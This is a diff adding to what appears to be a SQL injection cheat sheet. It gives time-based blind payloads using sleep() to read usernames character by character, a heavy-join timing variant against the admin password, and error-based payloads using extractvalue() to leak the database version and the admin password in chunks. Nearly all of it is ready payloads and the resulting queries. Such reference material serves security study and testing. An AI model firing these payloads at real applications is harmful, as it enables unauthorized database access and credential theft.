@@ -199,6 +199,27 @@ SELECT * FROM users WHERE idx='{idx}';
 <pre class="language-sql"><code class="lang-sql"># /?idx=' or sleep(3);#
 SELECT * FROM users WHERE idx='' or sleep(3);#';
 
+# /?idx=' or if(ascii(substr(username,{},1))={},sleep(3),0);#
+# first idx
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=32,sleep(3),0);#';
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=33,sleep(3),0);#';
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=34,sleep(3),0);#';
+...
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=125,sleep(3),0);#';
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=126,sleep(3),0);#';
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=127,sleep(3),0);#';
+
+# second idx 
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=32,sleep(3),0);#';
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=33,sleep(3),0);#';
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=34,sleep(3),0);#';
+...
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=125,sleep(3),0);#';
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=126,sleep(3),0);#';
+SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=127,sleep(3),0);#';
+...
+
+
 # Heavy SELECT Table 
 <strong># /?idx=1',(SELECT 1 FROM users WHERE username='admin' AND IF(length(password)={}, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16),1)));#
 </strong>SELECT * FROM users WHERE idx='1',(SELECT 1 FROM users WHERE username='admin' AND IF(length(password)=1, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16),1)));#'; (False)
@@ -218,7 +239,7 @@ SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' A
 SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=126, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
 SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=127, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
 
-# next idx 
+# second idx 
 SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=32, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
 SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=33, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
 SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=34, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
@@ -273,3 +294,27 @@ Query OK, 1 row affected (0.00 sec)
 
 
 
+
+
+## # Error based Blind SQL Injection&#x20;
+
+```sql
+SELECT * FROM users WHERE idx='{idx}';
+```
+
+### Payload
+
+```sql
+# /?idx=' UNION SELECT extractvalue(1,concat(0x3a,version()));#
+SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,version()));#';
+
+# /?idx=' UNION SELECT extractvalue(1,concat(0x3a,(SELECT password FROM user WHERE username='admin')));#
+SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));#';
+
+# /?idx=' UNION SELECT extractvalue(1,concat(0x3a,(SELECT substr(password,{},10) FROM users WHERE username='admin')));#
+SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,(SELECT substr(password,1,10) FROM users WHERE username='admin')));#';
+SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,(SELECT substr(password,11,10) FROM users WHERE username='admin')));#';
+SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,(SELECT substr(password,21,10) FROM users WHERE username='admin')));#';
+...
+
+```
